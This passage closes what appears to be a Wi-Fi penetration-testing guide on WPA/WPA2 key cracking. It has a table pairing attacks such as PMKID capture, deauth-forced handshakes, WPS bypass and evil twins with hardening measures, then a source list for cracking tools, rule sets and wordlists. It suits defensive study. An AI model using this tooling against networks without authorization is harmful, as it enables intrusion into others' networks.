| Any offline PSK crack | **Long, high-entropy passphrase** — random 20+ chars or a 5–6 word diceware phrase. Pushes the keyspace past centuries; every wordlist/mask/rule here fails by construction. PBKDF2 slowness becomes *your* ally. **This single control dominates.** |
| Mask / OSINT targeting | **Avoid the structures masks target:** no phone/date/`Word+Year`/ESSID-derived/vendor-hex keys; never reuse name, pet, address, ZIP, company, SSID tokens (if it's on LinkedIn or your front door, it's in the wordlist). |
| Default-key crack | **Change ISP/OEM default PSKs on day one** — vendor-shape masks fall in minutes-to-hours. |
| PMKID (clientless) | **Disable PMK caching / 802.11r roaming** where not needed (e.g. MikroTik "Disable PMKID", controller OKC toggles). Only ever helps a weak PSK — so defense #1 dominates. |
| Deauth-forced handshake | **Require PMF / 802.11w (Required, not Optional).** WPA3 mandates it; in WPA2+PMF-Optional, non-PMF clients can still be deauthed. |
| Offline crackability entirely | **Move to WPA3-SAE**, avoid transition mode for sensitive SSIDs (deploy SAE-only or SAE and WPA2 on *separate* SSIDs); keep AP+client firmware patched (Dragonblood). |
| WPS bypass of PSK strength | **Disable WPS** (Pixie-Dust / reaver bypass passphrase strength entirely). |
| PSK target existing at all | **802.1X/EAP (WPA-Enterprise)** — per-user creds, no single shared handshake to crack. |
| Evil twin / rogue AP | **WIDS/WIPS (nzyme, Kismet)** with an authorized SSID+BSSID baseline; alert on same-SSID/new-BSSID, unexpected channel, deauth floods, location anomalies. Client-side server-cert validation. |
| Recon generally | **Reduce TX power / shape coverage**; segment IoT + guests onto their own SSID/VLAN; rotate the PSK after any suspected capture or contractor/guest access; monitor for deauth/association bursts as early warning. |

**One line:** a strong passphrase defeats the *crack*; PMF/WPA3-SAE defeats the *capture*; a WIDS
baseline defeats the *twin*. Layer all three. Honest self-test: run CUPP/CeWL/Mentalist against your
own data — if they generate your key, change it.

---

## 22. Key sources

- hashcat wiki — *Cracking WPA/WPA2* (22000 workflow, hc22000 format, message-pair bits, capture rules): https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2
- hashcat forum — original PMKID disclosure (atom/Steube, mode 16800): https://hashcat.net/forum/thread-7717.html
- ZerBea **hcxdumptool** (6.3 CLI, chipsets, BPF, do-not list): https://github.com/ZerBea/hcxdumptool · **hcxtools**: https://github.com/ZerBea/hcxtools
- aircrack-ng Newbie Guide: https://www.aircrack-ng.org/doku.php?id=newbie_guide · Cracking WPA: https://www.aircrack-ng.org/doku.php?id=cracking_wpa
- Kali — wifite / hcxtools / wordlists / hashcat tool pages: https://www.kali.org/tools/
- bettercap wifi module: https://www.bettercap.org/modules/wifi/
- Rules: NotSoSecure *One Rule to Rule Them All* https://notsosecure.com/one-rule-to-rule-them-all · stealthsploit https://github.com/stealthsploit/Optimised-hashcat-Rule · TrustedSec *Know Your Rules* https://trustedsec.com/blog/better-hacking-through-cracking-know-your-rules
- Wordlists: berzerk0 Probable-Wordlists https://github.com/berzerk0/Probable-Wordlists · hashcat forum WPA strategies/stats (PACK 54%/37%/29%) https://hashcat.net/forum/thread-4431.html · wpa-sec https://wpa-sec.stanev.org/
- OSINT: CUPP https://github.com/Mebus/cupp · CeWL https://digi.ninja/projects/cewl.php · Mentalist https://github.com/sc0tfree/mentalist/wiki
- Apple Silicon: ecto-1a hashcat-on-Metal (M1 Max ≈248 kH/s) https://ecto-1a.github.io/hashcatmac/ · hashcat forum Apple Silicon thread https://hashcat.net/forum/thread-11876.html
- Defense/WPA3: Vanhoef & Ronen *Dragonblood* https://papers.mathyvanhoef.com/dragonblood.pdf · nzyme https://www.nzyme.org/capabilities/wireless · Kismet alerts https://kismetwireless.net/docs/readme/alerts/alerts/ · arXiv 2501.13363 (transition downgrade) https://arxiv.org/html/2501.13363v1
- Hardware: aircrack-ng rtl8188eus driver https://github.com/aircrack-ng/rtl8188eus

---

*Authorized testing only. Every BSSID on the allowlist, every session logged. Quietest technique that
works wins; a strong passphrase ends the game before it starts.*
